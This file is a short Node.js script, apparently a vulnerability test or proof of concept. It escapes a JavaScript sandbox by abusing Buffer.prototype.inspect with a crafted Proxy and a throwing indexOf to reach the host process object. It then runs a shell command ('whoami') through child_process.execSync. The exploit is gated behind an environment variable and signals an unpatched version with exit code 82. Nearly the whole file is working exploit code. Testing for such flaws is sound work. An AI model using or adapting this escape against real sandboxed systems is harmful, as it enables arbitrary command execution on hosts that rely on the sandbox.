if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

process.on("uncaughtException", (error) => {
	console.error(error);
	if (
		error.message === "Cannot read properties of undefined (reading 'require')"
	) {
		process.exit(82);
	}

	process.exit(1);
});

var buffer = new Proxy(() => {}, {
	get: (target, key) => (key === "hexSlice" ? () => "" : target[key]),
	ownKeys: () => ["constructor"],
});
var ctx = {
	seen: {
		indexOf(v) {
			throw v("return process")();
		},
	},
	showHidden: true,
};
var process;
try {
	Buffer.prototype.inspect.call(buffer, 0, ctx);
} catch (e) {
	process = e;
}
if (process === undefined) {
	throw "Version to old";
}
process.mainModule
	.require("child_" + "process")
	.execSync("whoami")
	.toString();
